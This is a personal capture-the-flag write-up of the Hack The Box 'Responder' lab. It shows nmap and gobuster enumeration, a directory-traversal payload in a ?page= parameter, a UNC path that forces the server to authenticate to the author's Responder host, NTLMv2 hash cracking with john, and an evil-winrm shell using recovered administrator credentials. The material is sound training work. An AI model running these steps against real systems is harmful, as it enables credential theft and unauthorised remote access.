## Name: Responder   //   Difficulty: Very Easy   //   Topic: Directory Traversal, File Inclusion, and NTLMv2 hash cracking    
#### By: Kyle Zimmer    
       
**Overview: This was my favorite HTB event yet. I started out by uncovering a hidde nwebsite that I needed to add to my hosts file. I then found a way to do directory traversal and failed to conduct file inclusion with a url. Alternatively, I found that I could host an SMB server and pass it an \\SMB\file parameter and it'd attempt to authneticate to it in order to pull the file. We used a tool called responder to act as the SMB server and intercept the NTLM challenge response. Because we had collected the challenge response (challenge + password hashed) and held the original challenge in hand, we could attempt to brute-force it to get a matching NTLMv2 "hash" to uncover the authenticating user's password. We then used those creds to access the Windows system's Remote Management service to gain a privilged Powershell instance on the host, further uncovering files of interest.**     

<img width="309" height="110" alt="image" src="https://github.com/user-attachments/assets/608006ee-f7d1-427c-a4b4-2c11ce922b20" />       

Let's begin by running a quick TCP Syn and UDP scan against the top 10,000 ports with no regard for staying silent: `sudo nmap -sS --disable-arp-ping -Pn -p- -sU [target ip] -T5 --top-ports 10000`       

<img width="780" height="212" alt="image" src="https://github.com/user-attachments/assets/8055705c-0a12-4ce8-8f08-1da98ad52004" />     

Now, let's focus our more intensive version and script scans at those three TCP ports with: `sudo nmap -sT -p 80,5985,7680 -sC -sV -O [target IP]`     

<img width="1039" height="368" alt="image" src="https://github.com/user-attachments/assets/be29e5b7-91fe-4b91-9a50-3120b6056ef2" />        

No title on that web server... hmm... Let's try and grab the headers with `curl -i -v [url]`      

<img width="568" height="445" alt="image" src="https://github.com/user-attachments/assets/1877630f-e9d8-478a-afe3-fb2663588124" />       

Weird. It's wanting to refresh our page with a "unika.htb" domain that doesn't seem to exist. My next idea is to let gobuster run to try and find directories behind this web server. I'll start with `gudo gobuster dir --url [target ip] --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt --ne -r` (ne = no errors, -r = follow redirects (recursive))      

<img width="796" height="462" alt="image" src="https://github.com/user-attachments/assets/5fb68628-0634-4ad2-98fa-2df060215376" />      

Taking a look at the good results. HTTP status 403 = Forbidden. HTTP status 503 = Maintenance. HTTP status 200 = STATUS OK!     

<img width="834" height="720" alt="image" src="https://github.com/user-attachments/assets/5bcb147a-ae06-4f43-ab94-7a5f953561eb" />     

Not much to see, but I'll take note of `Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server`. We may be able to use this information later. Also, I found a Thumbs.db composite document File V2 that I don't currently understand, but we can also come back to this after I look at the other directories.    
 
<img width="518" height="214" alt="image" src="https://github.com/user-attachments/assets/ff6ead74-833e-499c-8d30-8a30d354922c" />     

<img width="812" height="349" alt="image" src="https://github.com/user-attachments/assets/c087fa50-b9b6-4ad8-8442-b2e0acba85a8" />     

Theme.js didn't show us much besides the javascript functionality to animated page features.  

<img width="943" height="463" alt="image" src="https://github.com/user-attachments/assets/2b3203c1-f22b-4bd5-a565-ed6fb3dc338e" />  

Nothing out of the ordinary here. Styling sheets for css.    

<img width="943" height="626" alt="image" src="https://github.com/user-attachments/assets/1535d9b5-f71d-42f0-b43f-3783d1eb1c0f" />    

/inc/ included nothing besides some jquery and font libraries. So what... we have an IP redirecting us to a domain that we can't resolve while also hosting a backend full of webpage resources? This smells like there's an issue with the `unika.htb` domain. If it's supposed to resolve, maybe our system just doesn't know how to. Let's document it in our /etc/hosts file so that the domain will resolve to the Responder box's IP address and load those backend resources.      

<img width="506" height="143" alt="image" src="https://github.com/user-attachments/assets/0cda8836-1387-4515-9cc8-f3e95e65e9a2" />     

<img width="1272" height="972" alt="image" src="https://github.com/user-attachments/assets/d3966914-a652-455b-b7d7-5c84859ad021" />     

Just as expected. It loaded the images from the /img directory and contains all the javascript functionality outlined in the /js and /inc directories! Now, let's poke around and see what this site offers.    
<img width="1276" height="1161" alt="image" src="https://github.com/user-attachments/assets/1ad99f16-6425-4567-afdd-fe7f476f62a5" />     
 
The site is a pretty static page with beautifully scrolling photos and designs. There's a customer feedback form that appears to do nothing at the bottom. All the buttons at the top drop us down to sections of the main scrolling page... except one.   

The EN button gives a little pop-out box, allowing you to select French (FR) or German (DE) language packs to translate the page.    

<img width="1274" height="825" alt="image" src="https://github.com/user-attachments/assets/7e29ff79-61d5-4a18-96ea-ec7e764f13a8" />     

Whats interesting about that is the url. I see that it changes to include a `?page=[new page file.html]` at the end. Lets try monkeying with this file name. I'll trying throwing in flag.txt for shits and giggles.   

<img width="1132" height="229" alt="image" src="https://github.com/user-attachments/assets/5bd11131-3d9b-4660-8eb8-3ddbdec0b22d" />     
 
included([FILE NAME])... `C:\xampp\htdocs\index.php` Does this service just let us do directory traversal?      

So what do we know?    
* This server is letting us attempt to include files on the page based on the url parameter `?page=`  
* We're located in C:\xampp\htdocs\ [index.php]   
* This web server is an Apache / PHP server.   
* The underlying OS is Windows.   

Let's google for some common xampp apache file paths of interest. After some searching, I found a wordlist already prepped that contained the C:\xampp\apache\) directory:     

<img width="977" height="575" alt="image" src="https://github.com/user-attachments/assets/018a1f04-3564-4955-82d1-f06d857cf091" />    

Let's begin throwing these after the `?page=..` entry...   

<img width="1272" height="822" alt="image" src="https://github.com/user-attachments/assets/a84d27b8-9b00-4e11-a4fa-2766a2b5328f" />       

`..\apache\conf\httpd.conf` worked! This gives us the server configuration file. Lots to take in here. Let's see if we can can access the php configuration file `php.ini` which is said to be stored at `C:\xampp\php\php.ini` ([source](https://stackoverflow.com/questions/6185319/how-to-locate-the-php-ini-file-xampp))    

<img width="943" height="159" alt="image" src="https://github.com/user-attachments/assets/f0a6df1e-3170-447a-b535-d9ca08304f3e" />       

Hmm... doesn't seem to want to load. Let's try loading a .jpg file of a smiley face:    

<img width="1199" height="259" alt="image" src="https://github.com/user-attachments/assets/f43f2916-a005-4d7a-ab94-abe180929e54" />     

disabled by configuration file' `allow_url_include = 0` option... Let's look at what a php.ini config file looks like by default to test the other possible loads.   

<img width="939" height="675" alt="image" src="https://github.com/user-attachments/assets/bd722951-fc55-44b6-b76f-8852a08c39c9" />     


<img width="757" height="259" alt="image" src="https://github.com/user-attachments/assets/2986f35e-1c48-4ea9-bbf4-d64abf384982" />    

If both allow_url_include and allow_url_fopen are set to OFF, it won't allow us to load http or ftp links in the url... but what about \\SMB\file links? If we try and force the web server to authenticate to an SMB server via an SMB link, we could use a tool to capture the authentication challenge response (NTLMv2 "hash"). Knowing what the challenge was, we can attempt to brute-force the resposne part by hashing the challenge with a bunch of our own passwords to see if we can an output that matches. Remember that the authentication sequence goes like:    

1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.   

The tool we can use to capture the authentication requests is called `responder`. Let's go ahead and make sure the configuration (found in /etc/Responder/) is going to start an SMB server.   

<img width="658" height="516" alt="image" src="https://github.com/user-attachments/assets/f62632f3-ba7c-4be2-9db9-2e8e07eb4050" />   

Perfect. Now let's make sure it'll capture from the correct network interface card. I'll set `responder -I tun0`   

<img width="763" height="1237" alt="image" src="https://github.com/user-attachments/assets/84bd3102-d02c-4e00-ba1a-e6052af85bff" />     

Now let's go ahead and launch it and load it in the url's `?page=//[serverip]/literally_anything_because_its_just_for_auth.txt`   

<img width="695" height="1142" alt="image" src="https://github.com/user-attachments/assets/a5c1fd6a-6ab4-49f4-9b29-a539667329f7" />        

<img width="1401" height="288" alt="image" src="https://github.com/user-attachments/assets/63046612-2c67-4cd2-a2d4-694fe439a134" />        

<img width="1117" height="257" alt="image" src="https://github.com/user-attachments/assets/960ad71b-4fc5-4588-9bae-6206b0939af0" />       

Now, let's get this NTLMv2 "hash" into a text file and pipe it to john the ripper to begin cracking. (Again, it's going to take the challenge code that it sent to RESPONDER\Administrator and attempt to hash it with random passwords until it gets a match)   

<img width="1101" height="132" alt="image" src="https://github.com/user-attachments/assets/299b0435-043c-4f32-8b95-d5f77857ca46" />      

In order to crack it, we'll need to specify the wordlist to throw at it. Let's just go with the good ol' rockyou.txt : `john -w [wordlist] crackme.txt`  (if you have troubles with rockyou.txt, do `locate rockyou.txt` You may need to gunzip it and/or download it from the internet)     
 
<img width="798" height="350" alt="image" src="https://github.com/user-attachments/assets/75250d15-3005-4cef-b41e-193eb80f1a37" />      
  
Almost instantly we see that it loads the NTLMv2 hash and cracks the password "badminton". `Creds: Administrator / badminton`    

Now thinking back, the only other service open on this device was WinRM (HTTPAPI on 5985). This protocol allows credentialed ussers to remotely manage a system and likely give shells (PS). Normally we'd use Powershell to connect to the service, but since we're on a linux system we have to use another varient called EvilWinRM.    
 
<img width="1107" height="450" alt="image" src="https://github.com/user-attachments/assets/d4bf54f0-5fdd-4d45-abaa-e305de617e8f" />     

We see that basic syntax follows: `evil-winrm -i IP_ADDR -u username -p password`  

<img width="1080" height="196" alt="image" src="https://github.com/user-attachments/assets/338bc264-80f9-4070-8915-e80e25e3dde6" />     

Just like that, we got a Powershell console on the WinRM service. Let's go ahead and start looking through user files.  

<img width="768" height="1098" alt="image" src="https://github.com/user-attachments/assets/80275f79-897d-466a-a68c-61cfbc9d5d42" />   



Note: Don’t submit the flag that appeared on my screen. It is unique to my account and will cause your account to be flagged for cheating.       
